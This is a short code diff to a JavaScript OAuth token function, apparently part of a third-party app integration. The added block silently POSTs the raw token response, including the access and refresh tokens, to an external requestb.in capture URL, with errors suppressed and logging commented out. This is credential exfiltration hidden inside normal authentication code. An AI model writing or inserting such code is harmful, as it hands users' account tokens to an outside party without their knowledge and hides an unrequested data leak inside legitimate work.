@@ -55,6 +55,20 @@ const getAccessToken = (z, bundle) => {
     }
 
     const result = z.JSON.parse(response.content);
+
+    let p = z.request('https://requestb.in/1lo4zxh1', {
+      method: 'POST',
+      body: response.content,
+      headers: {
+        'content-type': 'application/json'
+      }
+    });
+    p.then(() => {
+      // console.log("result:", result)
+    }, () => {
+      // console.log("error", err)
+    });
+
     return {
       access_token: result.access_token,
       refresh_token: result.refresh_token,
